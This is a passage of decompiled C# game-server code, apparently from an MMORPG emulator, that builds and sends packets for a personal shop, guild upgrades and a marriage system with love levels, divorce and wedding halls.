				catch (Exception ex)
				{
					MainForm.WriteLine(1, "进元宝个人商店 3 出错" + base.Client.WorldId + "|" + base.Client.ToString() + " " + ex);
				}
				break;
			case 5:
				if (元宝个人商店是否开通 == 0)
				{
					元宝个人商店查询是否开通包(0);
				}
				else if (元宝个人商店是否开通 == 1)
				{
					元宝个人商店查询是否开通包(1);
				}
				break;
			case 4:
				break;
			}
		}

		private void 元宝个人商店出店(int 人物ID)
		{
			进店中 = false;
			打开仓库中 = false;
			进店中ID = 0;
			进元宝个人商店功能包(3, 3, 人物ID, base.人物全服ID, null, null);
			Players players = 得到人物数据(人物ID);
			if (players != null && players.个人商店 != null)
			{
				players.个人商店.个人商店是否使用中 = false;
				players.个人商店.进入人 = null;
				players.进元宝个人商店功能包(3, 3, players.人物全服ID, base.人物全服ID, null, null);
			}
		}

		private void 个人商店显示包(int 功能ID, int 人物ID, byte[] 商店名)
		{
			using 发包类 发包类 = new 发包类();
			发包类.Write4(1);
			发包类.Write4(人物ID);
			if (功能ID == 3)
			{
				发包类.Write4(人物ID);
			}
			else
			{
				发包类.Write4(uint.MaxValue);
			}
			if (商店名 != null)
			{
				发包类.Write2((byte)商店名.Length);
				发包类.Write(商店名, 0, 商店名.Length);
			}
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 2588, base.人物全服ID);
			}
			发送当前范围广播数据(发包类, 2588, base.人物全服ID);
		}

		private void 元宝个人商店功能包(int 功能ID, int ID说明, string 商店名, 个人商店物品类 物品)
		{
			using 发包类 发包类 = new 发包类();
			发包类.Write(功能ID);
			发包类.Write(ID说明);
			if (商店名 != null)
			{
				发包类.WriteAsciiFixed(商店名);
			}
			if (物品 != null)
			{
				发包类.Write8(物品.物品.Get物品ID);
				发包类.Write8(物品.物品.Get物品全局ID);
				发包类.Write2(物品.数量);
				发包类.Write2(物品.位置);
				发包类.Write8(物品.价格);
				发包类.Write4(物品.物品.FLD_MAGIC0);
				发包类.Write4(物品.物品.FLD_MAGIC1);
				发包类.Write4(物品.物品.FLD_MAGIC2);
				发包类.Write4(物品.物品.FLD_MAGIC3);
				发包类.Write4(物品.物品.FLD_MAGIC4);
				发包类.Write2(物品.物品.FLD_FJ_MAGIC0);
				发包类.Write2(物品.物品.FLD_FJ_MAGIC1);
				发包类.Write2(物品.物品.FLD_FJ_中级附魂);
				发包类.Write2(物品.物品.FLD_FJ_MAGIC2);
				发包类.Write2(物品.物品.FLD_FJ_MAGIC3);
				发包类.Write2(物品.物品.FLD_FJ_MAGIC4);
				发包类.Write2(物品.物品.FLD_FJ_MAGIC5);
				发包类.Write2(0);
				发包类.Write(物品.物品.FLD_KSSJ);
				发包类.Write(物品.物品.FLD_JSSJ);
				发包类.Write2(物品.物品.FLD_FJ_NJ);
				发包类.Write4(物品.物品.FLD_FJ_觉醒);
				发包类.Write2(0);
				发包类.Write2(物品.物品.FLD_FJ_进化);
				发包类.Write2(0);
			}
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 3100, base.人物全服ID);
			}
		}

		private void 进元宝个人商店功能包(int 功能ID, int ID说明, int 人物ID, int 人物ID2, byte[] 商店名, ThreadSafeDictionary<long, 个人商店物品类> 物品)
		{
			using 发包类 发包类 = new 发包类();
			发包类.Write(功能ID);
			发包类.Write(ID说明);
			发包类.Write4(人物ID);
			if (功能ID != ID说明)
			{
				发包类.Write(1);
			}
			if (商店名 != null)
			{
				发包类.Write2(商店名.Length);
				发包类.Write(商店名, 0, 商店名.Length);
				if (物品 != null)
				{
					发包类.Write2(物品.Count);
					foreach (个人商店物品类 value in 物品.Values)
					{
						发包类.Write8(value.物品.Get物品ID);
						发包类.Write8(value.物品.Get物品全局ID);
						发包类.Write2(value.数量);
						发包类.Write2(value.位置);
						发包类.Write8(value.价格);
						发包类.Write4(value.物品.FLD_MAGIC0);
						发包类.Write4(value.物品.FLD_MAGIC1);
						发包类.Write4(value.物品.FLD_MAGIC2);
						发包类.Write4(value.物品.FLD_MAGIC3);
						发包类.Write4(value.物品.FLD_MAGIC4);
						发包类.Write2(value.物品.FLD_FJ_MAGIC0);
						发包类.Write2(value.物品.FLD_FJ_MAGIC1);
						发包类.Write2(value.物品.FLD_FJ_中级附魂);
						发包类.Write2(value.物品.FLD_FJ_MAGIC2);
						发包类.Write2(value.物品.FLD_FJ_MAGIC3);
						发包类.Write2(value.物品.FLD_FJ_MAGIC4);
						发包类.Write2(value.物品.FLD_FJ_MAGIC5);
						发包类.Write2(0);
						发包类.Write4(value.物品.FLD_KSSJ);
						发包类.Write4(value.物品.FLD_JSSJ);
						发包类.Write2(value.物品.FLD_FJ_NJ);
						发包类.Write4(value.物品.FLD_FJ_觉醒);
						发包类.Write2(0);
						发包类.Write2(value.物品.FLD_FJ_进化);
						发包类.Write2(0);
					}
				}
			}
			else if (功能ID == ID说明)
			{
				发包类.Write4(人物ID2);
			}
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 3868, base.人物全服ID);
			}
		}

		private void 元宝个人商店查询是否开通包(int id)
		{
			using 发包类 发包类 = new 发包类();
			发包类.Write4(id);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 12316, base.人物全服ID);
			}
		}

		private void 元宝个人商店查询包(int id)
		{
			using 发包类 发包类 = new 发包类();
			发包类.Write4(id);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 50200, base.人物全服ID);
			}
		}

		private void 元宝个人商店查询协议(byte[] data, int length)
		{
			元宝个人商店协议包(1);
		}

		private void 元宝个人商店查询协议开通(byte[] data, int length)
		{
			元宝个人商店是否开通 = 1;
			using 发包类 发包类 = new 发包类();
			发包类.Write4(1);
			发包类.Write4(base.FLD_RXPIONT);
			发包类.Write4(25);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 6428, base.人物全服ID);
			}
		}

		private void 元宝个人商店协议包(int id)
		{
			元宝个人商店查询包(1);
			CheckTreasureGems();
			元宝个人商店查询包(0);
			using 发包类 发包类 = new 发包类();
			发包类.Write4(id);
			发包类.Write4(base.FLD_RXPIONT);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 5660, base.人物全服ID);
			}
		}

		public void 帮派升级()
		{
			if (base.帮派Id == 0)
			{
				return;
			}
			if (base.帮派人物等级 == 6)
			{
				DataTable dataTable = RxjhClass.得到帮派数据(base.帮派名字);
				if (dataTable == null)
				{
					return;
				}
				BitConverter.GetBytes(base.帮派Id);
				int num = int.Parse(dataTable.Rows[0]["Leve"].ToString());
				int num2 = 0;
				int num3 = 0;
				int num4 = 0;
				try
				{
					num4 = int.Parse(dataTable.Rows[0]["门派武勋"].ToString());
					num2 = int.Parse(dataTable.Rows[0]["胜"].ToString());
					num3 = int.Parse(dataTable.Rows[0]["败"].ToString());
					int.Parse(dataTable.Rows[0]["平"].ToString());
				}
				catch (Exception ex)
				{
					MainForm.WriteLine(1, "帮派升级出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
				}
				dataTable.Dispose();
				DataTable dataTable2 = RxjhClass.得到帮派人数(base.帮派名字);
				int count = dataTable2.Rows.Count;
				int num5 = 0;
				for (int i = 0; i < count; i++)
				{
					try
					{
						Players players = 得到人物数据(dataTable2.Rows[i]["FLD_NAME"].ToString());
						if (players != null)
						{
							num5++;
						}
					}
					catch (Exception ex2)
					{
						MainForm.WriteLine(1, "帮派升级 成员 错误![" + base.Userid + "]-[" + base.UserName + "]" + ex2.Message);
					}
				}
				dataTable2.Dispose();
				switch (num)
				{
				default:
					return;
				case 6:
					if (num == 6 && base.Player_Money >= 3000000)
					{
						base.Player_Money -= 3000000L;
						break;
					}
					系统提示("七级门派申请升级需要金币300万两游戏币", 9, "系统提示");
					return;
				case 5:
					if (num == 5 && base.Player_Money >= 1000000)
					{
						base.Player_Money -= 1000000L;
						break;
					}
					系统提示("六级门派申请升级需要金币100万两游戏币", 9, "系统提示");
					return;
				case 4:
					if (num == 4 && base.Player_Money >= 500000)
					{
						base.Player_Money -= 500000L;
						break;
					}
					系统提示("五级门派申请升级需要金币50万两游戏币", 9, "系统提示");
					return;
				case 3:
					if (num == 3 && base.Player_Money >= 300000)
					{
						base.Player_Money -= 300000L;
						break;
					}
					系统提示("四级门派申请升级需要金币30万两游戏币", 9, "系统提示");
					return;
				case 2:
					if (num == 2 && base.Player_Money >= 200000)
					{
						base.Player_Money -= 200000L;
						break;
					}
					系统提示("三级门派申请升级需要金币20万两游戏币", 9, "系统提示");
					return;
				case 1:
					if (num == 1 && base.Player_Money >= 100000)
					{
						base.Player_Money -= 100000L;
						break;
					}
					系统提示("二级门派申请升级需要金币10万两游戏币", 9, "系统提示");
					return;
				}
				base.帮派等级++;
				更新金钱和负重();
				string sqlCommand = $"UPDATE TBL_XWWL_Guild SET Leve=Leve+1 WHERE ID='{base.帮派Id}'";
				系统提示("门派等级升级成功...当前门派等级" + base.帮派等级, 10, "系统提示");
				DBA.ExeSqlCommand(sqlCommand);
				查帮派();
			}
			else
			{
				系统提示("抱歉你不是帮主，不可以进行帮派升级！", 9, "系统提示");
			}
		}

		public void 情侣系统(byte[] data, int length)
		{
			try
			{
				byte[] array = new byte[14];
				byte[] array2 = new byte[14];
				Buffer.BlockCopy(data, 33, array, 0, 14);
				string text = Encoding.Default.GetString(array).Replace("\0", string.Empty).Trim();
				Buffer.BlockCopy(data, 18, array2, 0, 14);
				string text2 = Encoding.Default.GetString(array2).Replace("\0", string.Empty).Trim();
				int num = data[10];
				int num4 = data[14];
				switch (num)
				{
				case 1:
				{
					if (base.FLD_情侣.Length != 0)
					{
						情侣提示(16, text2, text);
						break;
					}
					Players players = World.检查玩家name(text);
					if (players != null)
					{
						if (players.个人商店 == null && !players.进店中 && !players.打开仓库中)
						{
							if (players.FLD_情侣.Length != 0)
							{
								情侣提示(16, text2, text);
								break;
							}
							if (players.Config.告白开关 == 0)
							{
								情侣提示(21, text2, text);
								break;
							}
							if (players.Player_Sex == base.Player_Sex)
							{
								情侣提示(24, text2, text);
								break;
							}
							情侣提示(6, text2, text);
							players.情侣请求(1, text2, text);
						}
					}
					else
					{
						情侣提示(18, text2, text);
					}
					break;
				}
				case 3:
				{
					byte[] array4 = new byte[4];
					Buffer.BlockCopy(data, 54, array4, 0, 4);
					int 玫瑰ID = BitConverter.ToInt32(array4, 0);
					Players players2 = World.检查玩家name(text);
					if (players2 != null)
					{
						if (base.FLD_情侣 == players2.UserName)
						{
							if (players2.追加状态列表.ContainsKey(1000000891) || players2.追加状态列表.ContainsKey(1000000892) || players2.追加状态列表.ContainsKey(1000000893))
							{
								系统提示("对方已存在状态1");
							}
							else
							{
								players2.情侣送花请求(3, text2, text, 玫瑰ID);
							}
						}
					}
					else
					{
						情侣提示(18, text2, text);
					}
					break;
				}
				case 4:
				{
					Players players3 = World.检查玩家name(text);
					if (players3 != null)
					{
						if (是否已婚 == 1)
						{
							bool flag = false;
							bool flag2 = false;
							int 位置 = 0;
							int 位置2 = 0;
							for (int i = 0; i < 96; i++)
							{
								if (BitConverter.ToInt32(装备栏包裹[i].物品ID, 0) == 1000000415)
								{
									位置 = i;
									flag = true;
									break;
								}
							}
							for (int j = 0; j < 96; j++)
							{
								if (BitConverter.ToInt32(players3.装备栏包裹[j].物品ID, 0) == 1000000415)
								{
									位置2 = j;
									flag2 = true;
									break;
								}
							}
							if (flag && flag2)
							{
								base.FLD_情侣 = string.Empty;
								base.FLD_情侣_爱情度 = 0;
								是否已婚 = 0;
								婚戒刻字 = string.Empty;
								解除关系倒计时 = 0;
								players3.FLD_情侣 = string.Empty;
								players3.FLD_情侣_爱情度 = 0;
								players3.是否已婚 = 0;
								武功新[2, 16] = null;
								武功新[2, 17] = null;
								players3.婚戒刻字 = string.Empty;
								players3.解除关系倒计时 = 0;
								players3.武功新[2, 16] = null;
								players3.武功新[2, 17] = null;
								减去物品(位置, 1);
								players3.减去物品(位置2, 1);
								系统提示("离婚完成，请下线后再上", 9, "离婚");
								players3.系统提示("离婚完成，请下线后再上", 9, "离婚");
							}
							else
							{
								系统提示("双方离婚, 必须同时携带物品 " + ItmeClass.得到物品名称(1000000415), 50, "");
							}
						}
						else
						{
							base.FLD_情侣 = string.Empty;
							base.FLD_情侣_爱情度 = 0;
							是否已婚 = 0;
							婚戒刻字 = string.Empty;
							解除关系倒计时 = 0;
							players3.FLD_情侣 = string.Empty;
							players3.FLD_情侣_爱情度 = 0;
							players3.是否已婚 = 0;
							武功新[2, 16] = null;
							武功新[2, 17] = null;
							players3.婚戒刻字 = string.Empty;
							players3.解除关系倒计时 = 0;
							players3.武功新[2, 16] = null;
							players3.武功新[2, 17] = null;
							系统提示("离婚完成，请下线后再上", 9, "离婚");
							players3.系统提示("离婚完成，请下线后再上", 9, "离婚");
						}
					}
					else
					{
						情侣提示(18, text2, text);
					}
					break;
				}
				case 5:
					解除关系倒计时 = 4320;
					情侣提示(11, base.UserName, text);
					更新情侣系统(1, text, 婚戒刻字, 解除关系倒计时, DateTime.Now);
					RxjhClass.变更婚姻状态(text, 解除关系倒计时);
					break;
				case 7:
				{
					int num5 = data[14];
					Players players4 = World.检查玩家name(text2);
					if (players4 == null)
					{
						break;
					}
					if (num5 == 3)
					{
						base.FLD_情侣 = players4.UserName;
						players4.FLD_情侣 = base.UserName;
						解除关系倒计时 = 0;
						players4.解除关系倒计时 = 0;
						base.FLD_情侣_爱情度 = 35000;
						players4.FLD_情侣_爱情度 = 35000;
						FLD_爱情度等级 = 1;
						players4.FLD_爱情度等级 = 1;
						if (是否已婚 == 0 && players4.是否已婚 == 0)
						{
							是否已婚 = 1;
							players4.是否已婚 = 1;
							系统提示("恭喜您结婚啦，获得经验爆率增加10%.", 10, "结婚提示");
						}
						更新情侣系统(2, players4.UserName, 婚戒刻字, 解除关系倒计时, DateTime.Now);
						players4.更新情侣系统(2, base.UserName, players4.婚戒刻字, players4.解除关系倒计时, DateTime.Now);
						情侣提示(num5, text, text2);
						players4.情侣提示(num5, text2, text);
						players4.显示大字(base.人物全服ID, 403);
						显示大字(players4.人物全服ID, 403);
						World.发送玫瑰公告("恭喜[" + text2 + "]和[" + text + "]结为夫妻." + World.ServerName + "祝天下有情人终成眷属!!!");
					}
					else
					{
						情侣提示(num5, text2, text);
						players4.情侣提示(num5, text2, text);
					}
					break;
				}
				case 8:
				{
					byte[] array5 = new byte[4];
					Buffer.BlockCopy(data, 54, array5, 0, 4);
					int num2 = BitConverter.ToInt32(array5, 0);
					Players players9 = World.检查玩家name(text2);
					switch (num4)
					{
					case 8:
						if (players9 != null)
						{
							if (base.FLD_情侣 == players9.UserName)
							{
								players9.情侣提示(8, text2, text);
							}
						}
						else
						{
							情侣提示(18, text2, text);
						}
						break;
					case 7:
					{
						bool flag3 = false;
						if (追加状态列表.ContainsKey(1000000891) || 追加状态列表.ContainsKey(1000000892) || 追加状态列表.ContainsKey(1000000893))
						{
							break;
						}
						for (int k = 0; k < 96; k++)
						{
							if (BitConverter.ToInt32(players9.装备栏包裹[k].物品ID, 0) == num2)
							{
								flag3 = true;
								players9.减去物品(k, 1);
								break;
							}
						}
						if (!flag3)
						{
							情侣提示(16, text2, text);
							break;
						}
						int num3 = RNG.Next(10, 30);
						switch (num2)
						{
						case 1000000893:
							num3 = RNG.Next(30, 60);
							break;
						case 1000000892:
							num3 = RNG.Next(20, 40);
							break;
						}
						if (夫妻组队中)
						{
							num3 *= 2;
						}
						base.FLD_情侣_爱情度 += num3;
						players9.FLD_情侣_爱情度 += num3;
						if (base.FLD_情侣_爱情度 >= 35000)
						{
							base.FLD_情侣_爱情度 = 35000;
							FLD_爱情度等级 = 1;
						}
						else if (base.FLD_情侣_爱情度 > 30000)
						{
							if (FLD_爱情度等级 == 2)
							{
								情侣提示(27, base.UserName, players9.UserName);
							}
							FLD_爱情度等级 = 1;
						}
						else if (base.FLD_情侣_爱情度 > 21000)
						{
							if (FLD_爱情度等级 == 3)
							{
								情侣提示(27, base.UserName, players9.UserName);
							}
							FLD_爱情度等级 = 2;
						}
						else if (base.FLD_情侣_爱情度 > 14700)
						{
							if (FLD_爱情度等级 == 4)
							{
								情侣提示(27, base.UserName, players9.UserName);
							}
							FLD_爱情度等级 = 3;
						}
						else if (base.FLD_情侣_爱情度 > 10290)
						{
							if (FLD_爱情度等级 == 5)
							{
								情侣提示(27, base.UserName, players9.UserName);
							}
							FLD_爱情度等级 = 4;
						}
						else if (base.FLD_情侣_爱情度 > 7203)
						{
							if (FLD_爱情度等级 == 6)
							{
								情侣提示(27, base.UserName, players9.UserName);
							}
							FLD_爱情度等级 = 5;
						}
						else if (base.FLD_情侣_爱情度 > 5042)
						{
							if (FLD_爱情度等级 == 7)
							{
								情侣提示(27, base.UserName, players9.UserName);
							}
							FLD_爱情度等级 = 6;
						}
						else if (base.FLD_情侣_爱情度 > 3025)
						{
							if (FLD_爱情度等级 == 8)
							{
								情侣提示(27, base.UserName, players9.UserName);
							}
							FLD_爱情度等级 = 7;
						}
						else if (base.FLD_情侣_爱情度 > 1513)
						{
							if (FLD_爱情度等级 == 9)
							{
								情侣提示(27, base.UserName, players9.UserName);
							}
							FLD_爱情度等级 = 8;
						}
						else if (base.FLD_情侣_爱情度 > 605)
						{
							if (FLD_爱情度等级 == 10)
							{
								情侣提示(27, base.UserName, players9.UserName);
							}
							FLD_爱情度等级 = 9;
						}
						else
						{
							FLD_爱情度等级 = 10;
						}
						if (players9.FLD_情侣_爱情度 >= 35000)
						{
							players9.FLD_情侣_爱情度 = 35000;
							players9.FLD_爱情度等级 = 1;
						}
						else if (players9.FLD_情侣_爱情度 > 30000)
						{
							if (players9.FLD_爱情度等级 == 2)
							{
								players9.情侣提示(27, players9.UserName, base.UserName);
							}
							players9.FLD_爱情度等级 = 1;
						}
						else if (players9.FLD_情侣_爱情度 > 21000)
						{
							if (players9.FLD_爱情度等级 == 3)
							{
								players9.情侣提示(27, players9.UserName, base.UserName);
							}
							players9.FLD_爱情度等级 = 2;
						}
						else if (players9.FLD_情侣_爱情度 > 14700)
						{
							if (players9.FLD_爱情度等级 == 4)
							{
								players9.情侣提示(27, players9.UserName, base.UserName);
							}
							players9.FLD_爱情度等级 = 3;
						}
						else if (players9.FLD_情侣_爱情度 > 10290)
						{
							if (players9.FLD_爱情度等级 == 5)
							{
								players9.情侣提示(27, players9.UserName, base.UserName);
							}
							players9.FLD_爱情度等级 = 4;
						}
						else if (players9.FLD_情侣_爱情度 > 7203)
						{
							if (players9.FLD_爱情度等级 == 6)
							{
								players9.情侣提示(27, players9.UserName, base.UserName);
							}
							players9.FLD_爱情度等级 = 5;
						}
						else if (players9.FLD_情侣_爱情度 > 5042)
						{
							if (players9.FLD_爱情度等级 == 7)
							{
								players9.情侣提示(27, players9.UserName, base.UserName);
							}
							players9.FLD_爱情度等级 = 6;
						}
						else if (players9.FLD_情侣_爱情度 > 3025)
						{
							if (players9.FLD_爱情度等级 == 8)
							{
								players9.情侣提示(27, players9.UserName, base.UserName);
							}
							players9.FLD_爱情度等级 = 7;
						}
						else if (players9.FLD_情侣_爱情度 > 1513)
						{
							if (players9.FLD_爱情度等级 == 9)
							{
								players9.情侣提示(27, players9.UserName, base.UserName);
							}
							players9.FLD_爱情度等级 = 8;
						}
						else if (players9.FLD_情侣_爱情度 > 605)
						{
							if (players9.FLD_爱情度等级 == 10)
							{
								players9.情侣提示(27, players9.UserName, base.UserName);
							}
							players9.FLD_爱情度等级 = 9;
						}
						else
						{
							players9.FLD_爱情度等级 = 10;
						}
						情侣提示(29, base.UserName, players9.UserName);
						players9.情侣提示(29, players9.UserName, base.UserName);
						if (追加状态列表 != null)
						{
							if (GetAddState(1000000891))
							{
								追加状态列表[1000000891].时间结束事件();
							}
							if (GetAddState(1000000892))
							{
								追加状态列表[1000000892].时间结束事件();
							}
							if (GetAddState(1000000893))
							{
								追加状态列表[1000000893].时间结束事件();
							}
						}
						else
						{
							追加状态列表 = new ThreadSafeDictionary<int, 追加状态类>();
						}
						状态效果(BitConverter.GetBytes(num2), 1, 1790000);
						追加状态类 追加状态类2 = new 追加状态类(this, 1790000, num2, 0);
						追加状态列表.Add(追加状态类2.FLD_PID, 追加状态类2);
						switch (FLD_爱情度等级)
						{
						case 1:
							base.人物追加最大_HP += 150;
							base.FLD_人物_追加_攻击 += 15;
							base.FLD_人物_追加_防御 += 15;
							base.FLD_人物_追加_气功++;
							base.FLD_人物_追加_经验百分比 += 0.05;
							更新气功();
							break;
						case 2:
							base.人物追加最大_HP += 150;
							base.FLD_人物_追加_攻击 += 15;
							base.FLD_人物_追加_防御 += 15;
							base.FLD_人物_追加_气功++;
							更新气功();
							break;
						case 3:
							base.人物追加最大_HP += 150;
							base.FLD_人物_追加_攻击 += 15;
							base.FLD_人物_追加_防御 += 15;
							break;
						case 4:
							base.人物追加最大_HP += 150;
							base.FLD_人物_追加_攻击 += 10;
							base.FLD_人物_追加_防御 += 10;
							break;
						case 5:
							base.人物追加最大_HP += 150;
							base.FLD_人物_追加_攻击 += 10;
							base.FLD_人物_追加_防御 += 5;
							break;
						case 6:
							base.人物追加最大_HP += 150;
							base.FLD_人物_追加_攻击 += 5;
							base.FLD_人物_追加_防御 += 5;
							break;
						case 7:
							base.人物追加最大_HP += 150;
							base.FLD_人物_追加_攻击 += 5;
							break;
						case 8:
							base.人物追加最大_HP += 150;
							break;
						case 9:
							base.人物追加最大_HP += 100;
							break;
						case 10:
							base.人物追加最大_HP += 50;
							break;
						}
						更新武功和状态();
						更新HP_MP_SP();
						break;
					}
					}
					break;
				}
				case 12:
					情侣提示(38, text, text2, 0);
					情侣提示(38, text, text2, 1);
					情侣提示(38, text, text2, 2);
					break;
				case 13:
				{
					int num10 = data[66];
					int 地图3 = 9101;
					int num11 = 0;
					switch (num10)
					{
					case 1:
						num11 = 0;
						break;
					case 2:
						num11 = 1;
						break;
					}
					if (num10 != 0)
					{
						if (!检测婚宴厅进入条件(地图3, 1000000333))
						{
							break;
						}
						Players players8 = 得到人物数据(base.FLD_情侣);
						if (players8 != null)
						{
							物品类 物品类4 = 得到包裹物品(1000000333);
							if (物品类4 != null)
							{
								减去物品(物品类4.物品位置, 1);
							}
							婚礼入场券 = 1000000333;
							婚礼地图 = 地图3;
							婚礼模式 = num11;
							移动(0f, 280f, 15f, 婚礼地图);
							players8.移动(0f, 280f, 15f, 婚礼地图);
							预备时间 = DateTime.Now.AddMinutes(1.0);
							预备申请仪式计时器 = new System.Timers.Timer(30000.0);
							预备申请仪式计时器.Elapsed += 预备时间结束事件;
							预备申请仪式计时器.Enabled = true;
							预备申请仪式计时器.AutoReset = true;
							打开商店(168, 2, 0);
							系统提示("欢迎来到中式婚宴厅, 您有三分钟的时间来我这申请开始婚礼仪式。", 6, "月下老人");
							players8.系统提示("欢迎来到中式婚宴厅, 新娘请等待男方申请开始婚礼仪式。", 6, "月下老人");
						}
						else
						{
							情侣提示(18, base.UserName, base.FLD_情侣);
						}
					}
					else
					{
						情侣提示(40, base.UserName, base.FLD_情侣);
					}
					break;
				}
				case 14:
				{
					int num6 = data[66];
					int 地图 = 9001;
					int num7 = 0;
					switch (num6)
					{
					case 1:
						num7 = 0;
						break;
					case 2:
						num7 = 1;
						break;
					}
					if (num6 != 0)
					{
						if (!检测婚宴厅进入条件(地图, 1000000334))
						{
							break;
						}
						Players players5 = 得到人物数据(base.FLD_情侣);
						if (players5 != null)
						{
							物品类 物品类2 = 得到包裹物品(1000000334);
							if (物品类2 != null)
							{
								减去物品(物品类2.物品位置, 1);
							}
							婚礼入场券 = 1000000334;
							婚礼地图 = 地图;
							婚礼模式 = num7;
							移动(73f, -50f, 15f, 婚礼地图);
							players5.移动(73f, -50f, 15f, 婚礼地图);
							预备时间 = DateTime.Now.AddMinutes(3.0);
							预备申请仪式计时器 = new System.Timers.Timer(30000.0);
							预备申请仪式计时器.Elapsed += 预备时间结束事件;
							预备申请仪式计时器.Enabled = true;
							预备申请仪式计时器.AutoReset = true;
							打开商店(168, 2, 0);
							系统提示("欢迎来到中式婚宴厅, 您有三分钟的时间来我这申请开始婚礼仪式。", 6, "月下老人");
							players5.系统提示("欢迎来到中式婚宴厅, 新娘请等待男方申请开始婚礼仪式。", 6, "月下老人");
						}
						else
						{
							情侣提示(18, base.UserName, base.FLD_情侣);
						}
					}
					else
					{
						情侣提示(40, base.UserName, base.FLD_情侣);
					}
					break;
				}
				case 15:
				{
					int num8 = data[66];
					int 地图2 = 9201;
					int num9 = 0;
					switch (num8)
					{
					case 1:
						num9 = 0;
						break;
					case 2:
						num9 = 1;
						break;
					}
					if (num8 != 0)
					{
						if (!检测婚宴厅进入条件(地图2, 1000000335))
						{
							break;
						}
						Players players6 = 得到人物数据(base.FLD_情侣);
						if (players6 != null)
						{
							物品类 物品类3 = 得到包裹物品(1000000335);
							if (物品类3 != null)
							{
								减去物品(物品类3.物品位置, 1);
							}
							婚礼入场券 = 1000000335;
							婚礼地图 = 地图2;
							婚礼模式 = num9;
							移动(-59f, 53f, 15f, 婚礼地图);
							players6.移动(-48f, -104f, 15f, 婚礼地图);
							预备时间 = DateTime.Now.AddMinutes(3.0);
							预备申请仪式计时器 = new System.Timers.Timer(30000.0);
							预备申请仪式计时器.Elapsed += 预备时间结束事件;
							预备申请仪式计时器.Enabled = true;
							预备申请仪式计时器.AutoReset = true;
							打开商店(168, 2, 0);
							系统提示("欢迎来到中式婚宴厅, 您有三分钟的时间来我这申请开始婚礼仪式。", 6, "月下老人");
							players6.系统提示("欢迎来到中式婚宴厅, 新娘请等待男方申请开始婚礼仪式。", 6, "月下老人");
						}
						else
						{
							情侣提示(18, base.UserName, base.FLD_情侣);
						}
					}
					else
					{
						情侣提示(40, base.UserName, base.FLD_情侣);
					}
					break;
				}
				case 17:
				{
					if (!检测仪式申请条件(婚礼地图, 婚礼入场券))
					{
						break;
					}
					Players players7 = 得到人物数据(base.FLD_情侣);
					if (players7 != null)
					{
						if (!World.婚礼list.ContainsKey(婚礼地图))
						{
							Wedding value = new Wedding(this, players7, 婚礼地图, 婚礼模式);
							World.婚礼list.TryAdd(婚礼地图, value);
						}
						if (婚礼地图 == 9001)
						{
							World.华婚殿是否在使用中 = true;
						}
						else if (婚礼地图 == 9101)
						{
							World.龙赡殿是否在使用中 = true;
						}
						else if (婚礼地图 == 9201)
						{
							World.圣礼殿是否在使用中 = true;
						}
					}
					break;
				}
				case 20:
					证婚人提问答案 = data[66];
					break;
				case 21:
				{
					if (base.Player_Money < 10000000)
					{
						情侣提示(87, base.UserName, text);
						break;
					}
					if (base.FLD_情侣.Length == 0)
					{
						情侣提示(16, base.UserName, text);
						break;
					}
					if (得到包裹物品(1000000415) == null)
					{
						情侣提示(85, base.UserName, text);
						break;
					}
					if (解除关系倒计时 != 0)
					{
						情侣提示(53, base.UserName, text);
						break;
					}
					byte[] array3 = new byte[32];
					Buffer.BlockCopy(data, 78, array3, 0, 32);
					string text3 = Encoding.Default.GetString(array3).Replace("\0", string.Empty).Trim();
					更新情侣系统(1, text, text3, 解除关系倒计时, DateTime.Now);
					婚戒刻字 = text3;
					情侣提示(84, base.UserName, text);
					base.Player_Money -= 10000000L;
					更新金钱和负重();
					break;
				}
				case 2:
				case 6:
				case 9:
				case 10:
				case 11:
				case 16:
				case 18:
				case 19:
					break;
				}
			}
			catch (Exception)
			{
			}
		}

		public void 情侣送花请求(int ID, string 本人名字, string 对方名字, int 玫瑰ID)
		{
			byte[] array = Converter.hexStringToByte("AA5552007600791744000300000000000000D0D5BBCA4FC3FBB5DB000000000000306FD3F1C2B66F3000000000000000000022000000000000000000000000000000000000000000000000000000000000000000B7A655AA");
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(ID), 0, array, 10, 2);
			byte[] bytes = Encoding.Default.GetBytes(本人名字);
			byte[] bytes2 = Encoding.Default.GetBytes(对方名字);
			if (玫瑰ID != 0)
			{
				Buffer.BlockCopy(BitConverter.GetBytes(玫瑰ID), 0, array, 54, 4);
			}
			Buffer.BlockCopy(bytes, 0, array, 18, bytes.Length);
			Buffer.BlockCopy(bytes2, 0, array, 33, bytes2.Length);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 情侣提示(int id, string 本人名字, string 对方名字)
		{
			byte[] array = Converter.hexStringToByte("AA5552002C017A1744000C00000000000000B7B6CEDEBEC8000000000000000000DEB9D2C2B2DD000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(id), 0, array, 10, 2);
			byte[] bytes = Encoding.Default.GetBytes(本人名字);
			byte[] bytes2 = Encoding.Default.GetBytes(对方名字);
			Buffer.BlockCopy(bytes, 0, array, 18, bytes.Length);
			Buffer.BlockCopy(bytes2, 0, array, 33, bytes2.Length);
			if (base.Client != null)
			{
				base.Client.Send多包(array, array.Length);
			}
		}

		public void 情侣提示(int id, string 本人名字, string 对方名字, int 地图ID)
		{
			byte[] array = Converter.hexStringToByte("AA5552002C017A1744000C00000000000000B7B6CEDEBEC8000000000000000000DEB9D2C2B2DD000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(id), 0, array, 10, 2);
			byte[] bytes = Encoding.Default.GetBytes(本人名字);
			byte[] bytes2 = Encoding.Default.GetBytes(对方名字);
			Buffer.BlockCopy(bytes, 0, array, 18, bytes.Length);
			Buffer.BlockCopy(bytes2, 0, array, 33, bytes2.Length);
			Buffer.BlockCopy(BitConverter.GetBytes(地图ID), 0, array, 50, 2);
			if (base.Client != null)
			{
